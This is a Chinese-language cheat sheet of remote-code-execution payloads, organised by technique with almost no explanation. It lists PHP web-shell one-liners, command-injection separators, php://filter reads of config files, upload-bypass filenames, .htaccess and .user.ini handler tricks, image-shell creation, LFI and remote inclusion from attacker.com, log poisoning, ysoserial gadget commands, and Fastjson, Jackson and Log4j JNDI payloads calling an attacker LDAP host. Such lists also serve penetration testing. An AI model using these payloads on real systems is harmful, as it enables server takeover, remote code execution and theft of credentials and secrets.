# RCE详细分类

## 1. PHP代码执行

```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php popen($_GET['cmd'],'r'); ?>
<?php assert($_POST['cmd']); ?>
<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>
<?php call_user_func($_POST['cmd']); ?>
<?php $cmd=$_GET['cmd']; eval($cmd); ?>
```

---

## 2. PHP Filter链

```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

---

## 3. 命令注入

```
; whoami
| whoami
& whoami
&& whoami
|| whoami
$(whoami)
`whoami`
```

### 盲命令注入

Linux:
```
sleep 5
ping -c 5 127.0.0.1
```

Windows:
```
timeout /t 5
ping -n 5 127.0.0.1
```

---

## 4. PHP反序列化

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"cmd";s:2:"id";}
```

### CVE利用

- CVE-2019-9081 (Laravel)
- CVE-2020-15148 (Laravel)

---

## 5. Java反序列化

使用ysoserial:

```bash
java -jar ysoserial.jar CommonsCollections1 "command"
java -jar ysoserial.jar CommonsCollections2 "command"
java -jar ysoserial.jar GadgetChain1 "command"
java -jar ysoserial.jar Groovy1 "command"
```

### 常见Gadget

- CommonsCollections1-7
- Spring1
- JBoss
- Clojure
- Kotlin

---

## 6. 文件上传漏洞

### 基础绕过

```
filename=shell.php
filename=shell.jpg (包含PHP代码)
Content-Type: image/jpeg
```

### 扩展名绕过

```
shell.php
shell.php5
shell.php4
shell.php3
shell.phtml
shell.phar
```

### 双扩展名

```
shell.php.jpg
shell.jpg.php
```

### 00截断

```
shell.php%00.jpg
shell.php .jpg
```

### .htaccess

```
AddType application/x-httpd-php .jpg
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini

```
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
```

### 图片马

```bash
copy 1.jpg /b + shell.php /b shell.jpg
```

---

## 7. 文件包含RCE

### 本地文件包含

```
?page=../../../../etc/passwd
?page=/var/www/html/config.php
```

### 远程文件包含

```
?page=http://attacker.com/shell.txt
?page=php://input
```

### 伪协议

```
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain,<?php system('id');?>
expect://id
```

---

## 8. 日志投毒RCE

### Apache日志

```
访问: <?php system($_GET['cmd']);?>
?page=/var/log/apache2/access.log&cmd=whoami
```

### SSH日志

```
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```

---

## 9. 图片马RCE

```bash
# 生成图片马
copy 1.jpg /b + shell.php /b shell.jpg

# 上传后包含
?page=upload/shell.jpg
```

---

## 10. .htaccess利用

```
# 方法1: AddType
AddType application/x-httpd-php .jpg

# 方法2: SetHandler
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>

# 方法3: php_value
php_value auto_prepend_file "shell.jpg"
```

---

## 11. 反序列化漏洞

### Fastjson

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64"],"_name":"a","_tfactory":{},"_outputProperties":{}}
```

### Jackson

```json
{"@class":"java.lang.ProcessBuilder","@constructor_args":[{"@type":"java.util.ArrayList","@items":["calc.exe"]}],"start":""}
```

### Log4j (CVE-2021-44228)

```
${jndi:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```
